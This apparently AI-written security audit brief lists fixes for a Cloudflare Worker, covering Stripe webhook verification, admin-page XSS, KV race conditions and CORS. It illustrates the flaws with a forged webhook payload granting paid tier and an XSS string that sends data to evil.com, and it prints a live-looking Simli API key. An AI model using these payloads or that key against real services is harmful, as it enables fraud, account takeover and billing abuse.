# KingshotPro Worker — Fix Brief
**Produced by:** Audit Claude, Session April 16, 2026
**For:** The Claude assigned to implement fixes
**File under review:** `KingshotPro/worker/worker.js`
**Status:** DO NOT DEPLOY until blocking items are resolved

---

## How to use this document

Read it fully before touching any code. Understand the issue before writing the fix. After each fix, re-read the surrounding function to confirm no new breakage was introduced.

Fixes are ordered by severity. Work top to bottom. Do not skip ahead. After all fixes are applied, manually trace the full execution path of `/stripe/webhook`, `/kingdom/request`, and `/advisor/chronicle` before marking done.

**Do not fix things not listed here.** This was a go/no-go audit, not a refactor. If you see something else, flag it and ask.

---

## FIX 1 — Stripe webhook signature verification
**Severity: BLOCKING — critical security**
**Location:** `worker.js:1028–1104` (`handleStripeWebhook`)

### The problem
The webhook accepts any POST to `/stripe/webhook` and processes it as if it came from Stripe. There is no `Stripe-Signature` header verification. An attacker who knows (or guesses) the endpoint URL can POST a crafted payload to grant Pro tier or credits to any email address. Example:

```json
{
  "type": "checkout.session.completed",
  "data": {
    "object": {
      "mode": "subscription",
      "customer_email": "attacker@example.com",
      "customer": "cus_fake123"
    }
  }
}
```

This gives `attacker@example.com` Pro tier for free. No authentication. No rate limiting.

### What the fix requires
Stripe signs every webhook with an HMAC-SHA256 signature, sent in the `Stripe-Signature` header as `t=TIMESTAMP,v1=SIGNATURE`. The raw request body must be signed with the webhook signing secret. Cloudflare Workers has Web Crypto available via the global `crypto.subtle`.

**Step 1:** Add `STRIPE_WEBHOOK_SECRET` to the Cloudflare Worker environment variables in the Cloudflare dashboard. Get the value from Stripe Dashboard → Developers → Webhooks → (your endpoint) → Signing secret.

**Step 2:** Replace the current `handleStripeWebhook` opening block with:

```javascript
async function handleStripeWebhook(request, env) {
  const rawBody = await request.text();
  const sigHeader = request.headers.get('Stripe-Signature');
  const secret = env.STRIPE_WEBHOOK_SECRET;

  if (!secret) {
    // No secret configured — reject all webhook events rather than process unverified
    return corsWrap('{"error":"webhook secret not configured"}', 500);
  }

  if (!sigHeader) {
    return corsWrap('{"error":"missing signature"}', 400);
  }

  // Verify Stripe signature
  const verified = await verifyStripeSignature(rawBody, sigHeader, secret);
  if (!verified) {
    return corsWrap('{"error":"invalid signature"}', 400);
  }

  let event;
  try {
    event = JSON.parse(rawBody);
  } catch {
    return corsWrap('{"error":"invalid payload"}', 400);
  }
  // ... rest of existing function unchanged ...
}
```

**Step 3:** Add this helper function anywhere in the file (e.g., near the bottom with other helpers):

```javascript
async function verifyStripeSignature(rawBody, sigHeader, secret) {
  try {
    const parts = sigHeader.split(',');
    const tPart = parts.find(function(p) { return p.startsWith('t='); });
    const v1Part = parts.find(function(p) { return p.startsWith('v1='); });
    if (!tPart || !v1Part) return false;

    const timestamp = tPart.slice(2);
    const expectedSig = v1Part.slice(3);
    const payload = timestamp + '.' + rawBody;

    const key = await crypto.subtle.importKey(
      'raw',
      new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
    const sigBytes = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(payload));
    const computed = Array.from(new Uint8Array(sigBytes))
      .map(function(b) { return b.toString(16).padStart(2, '0'); })
      .join('');

    return computed === expectedSig;
  } catch {
    return false;
  }
}
```

### Verify your fix
After implementing, confirm:
1. A POST to `/stripe/webhook` with no `Stripe-Signature` header returns 400.
2. A POST with a valid JSON body but wrong signature returns 400.
3. A POST with a correctly-computed signature processes the event. (You can test with Stripe CLI: `stripe trigger checkout.session.completed`.)

---

## FIX 2 — Stored XSS in admin HTML pages
**Severity: BLOCKING — admin account takeover**
**Location:** `worker.js:571–611` (`handleVerifyAdminPage`), `worker.js:658–697` (`handleSurveyAdmin`)

### The problem
Both admin page functions build HTML strings by directly interpolating user-submitted data without escaping. An attacker who submits a verification request with a malicious `nickname` or `fid` can execute arbitrary JavaScript in the admin's browser when the admin opens the admin panel.

**Attack vector in `handleVerifyAdminPage`:**

User submits `POST /verify/request` with `fid: "x\');fetch('https://evil.com/?k='+document.URL);//"`.

The admin panel renders:
```html
<button onclick="markSent('x');fetch('https://evil.com/?k='+document.URL);//')">Mark Sent</button>
```

The malicious script fires when admin clicks the button (or even just loads the page if the nickname contains `<script>`).

A `nickname` like `<img src=x onerror="alert(1)">` also executes on page load.

### What the fix requires

**Step 1:** Add an HTML escape helper at the top of the file (after the constants, before `export default`):

```javascript
function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

**Step 2:** In `handleVerifyAdminPage`, wrap every user-supplied value:

Current (dangerous):
```javascript
rows += '<tr>' +
  '<td>' + (req.nickname || 'Unknown') + '</td>' +
  '<td>' + fid + '</td>' +
  '<td>' + req.kingdom + '</td>' +
  '<td>' + req.email + '</td>' +
  '<td style="font-size:20px;font-weight:bold;color:#f0c040;">' + req.code + '</td>' +
  '<td>' + req.status + '</td>' +
  '<td>' + age + 'h ago</td>' +
  '<td>' + (req.status === 'pending' ?
    '<button onclick="markSent(\'' + fid + '\')">Mark Sent</button>' :
    req.status === 'code_sent' ? 'Waiting for player...' : 'Done') +
  '</td></tr>';
```

Fixed:
```javascript
var safeFid = escapeHtml(fid);
var safeNickname = escapeHtml(req.nickname || 'Unknown');
var safeKingdom = escapeHtml(req.kingdom);
var safeEmail = escapeHtml(req.email);
var safeCode = escapeHtml(req.code);
var safeStatus = escapeHtml(req.status);

rows += '<tr>' +
  '<td>' + safeNickname + '</td>' +
  '<td>' + safeFid + '</td>' +
  '<td>' + safeKingdom + '</td>' +
  '<td>' + safeEmail + '</td>' +
  '<td style="font-size:20px;font-weight:bold;color:#f0c040;">' + safeCode + '</td>' +
  '<td>' + safeStatus + '</td>' +
  '<td>' + age + 'h ago</td>' +
  '<td>' + (req.status === 'pending' ?
    '<button onclick="markSent(' + JSON.stringify(String(fid)) + ')">Mark Sent</button>' :
    req.status === 'code_sent' ? 'Waiting for player...' : 'Done') +
  '</td></tr>';
```

Note the onclick specifically: use `JSON.stringify(String(fid))` not `escapeHtml(fid)`. The value goes into a JS string literal, not HTML text. `JSON.stringify` produces a properly JS-escaped quoted string (e.g., `"1234567"`). HTML escaping `'` to `&#39;` does not prevent JavaScript injection inside an `onclick` attribute.

**Step 3:** In `handleSurveyAdmin`, wrap every survey field:

Current (dangerous):
```javascript
rows += '<tr>' +
  '<td>' + (d.role || '-') + '</td>' +
  '<td>' + (d.playtime || '-') + '</td>' +
  // ... etc
```

Fixed (apply `escapeHtml` to every cell):
```javascript
rows += '<tr>' +
  '<td>' + escapeHtml(d.role || '-') + '</td>' +
  '<td>' + escapeHtml(d.playtime || '-') + '</td>' +
  '<td>' + escapeHtml(d.events_tracked || '-') + '</td>' +
  '<td>' + escapeHtml(d.current_tracking || '-') + '</td>' +
  '<td>' + escapeHtml(d.members || '-') + '</td>' +
  '<td>' + escapeHtml(d.hardest || '-') + '</td>' +
  '<td>' + escapeHtml(d.want_to_see || '-') + '</td>' +
  '<td>' + escapeHtml(d.wish || '-') + '</td>' +
  '<td>' + escapeHtml(d.use_ai || '-') + '</td>' +
  '<td>' + escapeHtml(d._submitted || '-') + '</td>' +
  '</tr>';
```

### Verify your fix
After implementing: submit a verification request via `POST /verify/request` with `fid: "<script>alert(1)</script>"`. Load the admin page. Confirm the script tag appears as literal escaped text in the table, not as an executing script.

---

## FIX 3 — Kingdom request queue race condition
**Severity: BLOCKING — paying users lose requests**
**Location:** `worker.js:1117–1151` (`handleKingdomRequest`), `worker.js:1154–1159` (`handleKingdomRequestsAdmin`)

### The problem
Two race conditions:

**Race A (queue write):** Two concurrent requests both read the same `kingdom_requests` array from KV, both push their entry, both write back. One write overwrites the other. One user is charged credits but their request is silently dropped — they get nothing.

**Race B (TOCTOU credit check):** Two simultaneous requests from the same user both read the same credit balance, both pass the `balance < cost` check, both deduct. The user can spend 5 credits and get two kingdom-add requests honored. Smaller blast radius, but real.

### What the fix requires

Replace the shared JSON array queue with **individual KV keys per request**. This eliminates Race A entirely: each write targets a unique key, so concurrent writes don't overwrite each other. CF KV's `list` operation supports prefix scanning to retrieve all requests.

**Step 1:** In `handleKingdomRequest`, replace:
```javascript
// Add to request queue
let queue = await env.KV.get('kingdom_requests', { type: 'json' }) || [];
queue.push({ email: user.email, type, kingdom, ts: Date.now(), status: 'pending' });
await env.KV.put('kingdom_requests', JSON.stringify(queue));
```

With:
```javascript
// Write each request as a unique KV entry — avoids queue write race
const reqTs = Date.now();
const reqKey = 'kingdom_req:' + reqTs + ':' + user.email;
await env.KV.put(reqKey, JSON.stringify({
  email: user.email, type, kingdom, ts: reqTs, status: 'pending'
}));
```

**Step 2:** In `handleKingdomRequestsAdmin`, replace the array read with a prefix list:
```javascript
async function handleKingdomRequestsAdmin(request, env, url) {
  const key = url.searchParams.get('key');
  if (key !== env.ADMIN_KEY) return corsWrap('{"error":"unauthorized"}', 401);

  // List all kingdom request keys
  const listed = await env.KV.list({ prefix: 'kingdom_req:' });
  const requests = [];
  for (const k of listed.keys) {
    const entry = await env.KV.get(k.name, { type: 'json' });
    if (entry) requests.push(entry);
  }
  // Sort by timestamp ascending
  requests.sort(function(a, b) { return (a.ts || 0) - (b.ts || 0); });
  return corsWrap(JSON.stringify({ requests: requests }));
}
```

**Race B (TOCTOU) — partial mitigation:** After deducting credits, check that the balance didn't go negative and reject if so:

```javascript
// Deduct credits
user.credits = balance - cost;
if (user.credits < 0) {
  // Concurrent request beat us — reject
  return corsWrap(JSON.stringify({ error: 'insufficient_credits', balance: 0, cost }), 402, origin);
}
```

This doesn't fully prevent Race B (both could still pass the initial check), but it prevents the balance from going permanently negative. Full prevention requires an atomic operation (Durable Objects), which is out of scope for this fix.

### Note on existing `kingdom_requests` KV key
If there is existing data in the `kingdom_requests` key from before this fix, it will no longer be read by the admin endpoint. If that data is important, migrate it first by reading the array, writing each entry as an individual `kingdom_req:` key, then deleting the old key. Ask the Architect before doing this.

### Verify your fix
After implementing: confirm that `GET /kingdom/requests?key=ADMINKEY` returns a `requests` array. Confirm that two rapid POSTs to `/kingdom/request` each produce separate KV entries (check via the admin endpoint).

---

## FIX 4 — CORS on Pro feature endpoints
**Severity: BLOCKING — Pro features may be broken for cross-origin credentialed requests**
**Location:** `worker.js:944` (`handleChronicle`), `worker.js:963` (`handleIllustration`), `worker.js:1007` (`handlePortrait`), `worker.js:236` (`handleAdvisorChat`)

### The problem
All four functions call `getUser()` (which reads the session cookie) but return responses via `corsWrap()` without passing `origin`. When the browser sends `credentials: 'include'` on a cross-origin request, it requires the response to have `Access-Control-Allow-Origin: <exact-origin>` AND `Access-Control-Allow-Credentials: true`. A response with `Access-Control-Allow-Origin: *` (the current behavior) causes the browser to silently discard the response.

For `handleChronicle`, `handleIllustration`, and `handlePortrait`: these are Pro-only features. They require `getUser()` to return a user, which requires the cookie to be sent, which requires `credentials: 'include'`. If the response is then blocked by CORS, the feature never works from the browser.

For `handleAdvisorChat`: the main chat endpoint. If the frontend sends `credentials: 'include'` (which is likely — cookies control tier routing), logged-in users receive blocked responses. Verify by searching `advisor-chat.js` for `credentials`.

### What the fix requires

**Pattern:** Extract origin at the top of the function, pass it to every `corsWrap` call.

**`handleChronicle` (line ~944):**
```javascript
async function handleChronicle(request, env) {
  const origin = request.headers.get('Origin');  // ADD THIS
  const user = await getUser(request, env);
  if (!tierAtLeast(user, 'pro')) return corsWrap('{"error":"tier_required","required":"pro"}', 403, origin);  // pass origin

  let playerContext, advisorName, archetype;
  try {
    const body = await request.json();
    playerContext = body.playerContext;
    advisorName = body.advisorName;
    archetype = body.archetype;
  } catch {
    return corsWrap('{"error":"bad request"}', 400, origin);  // pass origin
  }

  // ... existing AI call ...
  return corsWrap(JSON.stringify({ chronicle: text, generated: new Date().toISOString() }), 200, origin);  // pass origin
}
```

Apply the same pattern to `handleIllustration` and `handlePortrait`:
- Add `const origin = request.headers.get('Origin');` at the top of each
- Add `origin` as the third argument to every `corsWrap(...)` call in each function
- Wrap `request.json()` in try/catch (currently missing — see Fix 7 below)

**`handleAdvisorChat`:** This function is large (~130 lines). The fix is the same:
- Add `const origin = request.headers.get('Origin');` near the top (after the `try { const body = await request.json() }` block)
- Pass `origin` to every `corsWrap(...)` call in the function

There are multiple return points in `handleAdvisorChat`. Find all of them:
- `return corsWrap('{"error":"bad request"}', 400);` (line ~246)
- `return corsWrap('{"error":"energy_depleted","tier":"free"}', 403);` (two instances, lines ~259 and ~267)
- `return corsWrap(JSON.stringify({ error: 'ai service unreachable', ... }), 502);` (line ~330)
- `return corsWrap(JSON.stringify({...}), 200);` (line ~357 — the success return)

All of them must receive `origin` as third argument.

### Verify your fix
Open browser dev tools. Call `/advisor/chronicle` from the KingshotPro frontend (logged in as a Pro user). Confirm the response is NOT blocked with a CORS error. Confirm the Chronicle text renders correctly.

---

## FIX 5 — Hardcoded Simli API key
**Severity: NON-BLOCKING but must be addressed before any public code sharing**
**Location:** `worker.js:853`

### The problem
```javascript
headers: { 'x-simli-api-key': env.SIMLI_KEY || '05ll4nqf31s20n3gk232x4fi' },
```

A Simli API key is hardcoded as a fallback. If `SIMLI_KEY` is not set in the CF Worker environment, this key is used — and billed to whoever owns it. More importantly, this key is now in the source file. If this file is ever committed to a repository, the key is public.

### What the fix requires
**Option A (preferred):** Remove the fallback entirely. If SIMLI_KEY is not configured, fail fast.
```javascript
if (!env.SIMLI_KEY) return corsWrap('{"error":"simli not configured"}', 503);
headers: { 'x-simli-api-key': env.SIMLI_KEY },
```

**Option B:** Remove the fallback and rotate the key. If `05ll4nqf31s20n3gk232x4fi` has been in any git commit or shared file, treat it as compromised. Generate a new key in the Simli dashboard and add it to CF env as `SIMLI_KEY`.

**Ask the Architect** which option to apply and whether the key needs rotation.

---

## FIX 6 — Session KV entries accumulate without TTL
**Severity: NON-BLOCKING (minor operational hygiene)**
**Location:** `worker.js:226`

### The problem
```javascript
await env.KV.put(`session:${sessionToken}`, JSON.stringify({ email }));
```

The session cookie has `Max-Age=2592000` (30 days), but the KV entry for the session has no expiration. After a user's cookie expires, their session KV entry remains forever. Over time, KV fills with dead session entries.

### What the fix requires
Add an expiration TTL matching the cookie lifespan:
```javascript
await env.KV.put(`session:${sessionToken}`, JSON.stringify({ email }), { expirationTtl: 2592000 });
```

---

## FIX 7 — Missing try/catch on request.json() in Pro endpoints
**Severity: NON-BLOCKING (minor, results in unhandled 500 instead of clean 400)**
**Location:** `worker.js:949` (handleChronicle), `worker.js:967` (handleIllustration), `worker.js:1013` (handlePortrait)

### The problem
All three functions call `await request.json()` without a try/catch. A malformed request body throws an unhandled exception, causing Cloudflare Workers to return a generic 500 error response. Every other endpoint in the file wraps this in try/catch. These three are inconsistent.

Note: Fix 4 already asks you to add `origin` extraction and pass it through. Combine with Fix 7 when editing these functions.

### What the fix requires
Wrap the `request.json()` destructuring in each function in a try/catch. Example for `handleChronicle`:

```javascript
let playerContext, advisorName, archetype;
try {
  const body = await request.json();
  playerContext = body.playerContext;
  advisorName = body.advisorName;
  archetype = body.archetype;
} catch {
  return corsWrap('{"error":"bad request"}', 400, origin);
}
```

Apply the same pattern to `handleIllustration` and `handlePortrait`.

---

## DECISIONS FOR THE ARCHITECT (not code fixes)

These require a business decision before code is written. Flag them when your fixes are ready.

### Decision A — Pre-existing subscriber cancellation
**Context:** Users who subscribed under the old webhook code have no `stripe_cust:` KV reverse mapping. When they cancel, the worker returns `{"ok":true,"note":"no customer mapping"}` and does nothing — they keep Pro indefinitely.

**Options:**
1. Accept for now. New subscribers will have correct mappings. Legacy subscribers cancelling is a known gap until they churn or re-subscribe.
2. On cancellation, fall back to calling the Stripe API to look up the customer and find their email directly: `GET https://api.stripe.com/v1/customers/{customerId}`. This requires `env.STRIPE_KEY` (Stripe secret key) to be added to CF env.
3. Build a one-time migration script that populates `stripe_cust:` entries for existing subscribers by calling Stripe's subscription list API.

### Decision B — `past_due` / `incomplete_expired` subscription statuses
**Context:** The cancellation handler only downgrades users when `sub.status === 'canceled' || sub.status === 'unpaid'`. Stripe also uses `past_due` and `incomplete_expired` statuses when payment fails.

**Options:**
1. Add both statuses to the downgrade condition:
   ```javascript
   if (['canceled', 'unpaid', 'past_due', 'incomplete_expired'].includes(sub.status)) {
   ```
2. Leave as-is and accept that payment-failed users retain Pro until Stripe eventually marks the subscription `canceled`.

### Decision C — ADMIN_KEY fallback inconsistency
**Context:** `handleKingdomRequestsAdmin` uses `env.ADMIN_KEY` with no fallback (endpoint inaccessible if ADMIN_KEY not set). All other admin endpoints use `env.ADMIN_KEY || 'admin'` (fall back to 'admin' if not set). This is stricter behavior for this endpoint.

**Options:**
1. Make it consistent with other endpoints by adding `|| 'admin'` fallback.
2. Accept the inconsistency as intentional (stricter auth for queue data containing user emails).
3. Standardize ALL admin endpoints to require an explicit ADMIN_KEY with no fallback (more secure — eliminates the `'admin'` default password across the board).

---

## Checklist for the fixing Claude

Work through this in order. Check each item when complete.

**BLOCKING — must fix before deploy:**
- [ ] Fix 1: Stripe webhook signature verification + add `STRIPE_WEBHOOK_SECRET` to CF env
- [ ] Fix 2: XSS in `handleVerifyAdminPage` (escapeHtml helper + apply to all fields + onclick via JSON.stringify)
- [ ] Fix 2: XSS in `handleSurveyAdmin` (apply escapeHtml to all survey fields)
- [ ] Fix 3: Kingdom request queue — switch from shared JSON array to individual KV keys
- [ ] Fix 3: Kingdom request TOCTOU — add post-deduction negative balance check
- [ ] Fix 4: Add origin to corsWrap in `handleChronicle`, `handleIllustration`, `handlePortrait`
- [ ] Fix 4: Confirm whether `advisor-chat.js` uses `credentials: 'include'`; if yes, add origin to all corsWrap calls in `handleAdvisorChat`

**NON-BLOCKING — fix in same session if possible:**
- [ ] Fix 5: Remove hardcoded Simli key fallback (confirm with Architect whether to rotate)
- [ ] Fix 6: Add `expirationTtl: 2592000` to session KV put
- [ ] Fix 7: Add try/catch around `request.json()` in handleChronicle, handleIllustration, handlePortrait

**Decisions needed from Architect before these are coded:**
- [ ] Decision A: Pre-existing subscriber cancellation fallback
- [ ] Decision B: Add `past_due`/`incomplete_expired` to cancellation downgrade
- [ ] Decision C: ADMIN_KEY fallback standardization

---

## Verify before handing back

1. Trace `/stripe/webhook` with a Stripe-signed event. Confirm verification passes. Confirm a request without a valid signature is rejected.
2. Submit a verification request with `fid: "<script>alert(1)</script>"`. Open `/verify/admin?key=ADMINKEY`. Confirm no script execution.
3. Call `/kingdom/request` as a logged-in user. Confirm a `kingdom_req:` key appears in KV. Confirm `/kingdom/requests?key=ADMINKEY` returns it.
4. Call `/advisor/chronicle` from the browser as a Pro user. Confirm no CORS error in console.
5. Grep the file for `PRICE_TO_CREDITS`, `PRICE_TO_TIER`, `war_council`, `elite` — all must remain zero-match.
6. Confirm the file still has no `sleep` commands.
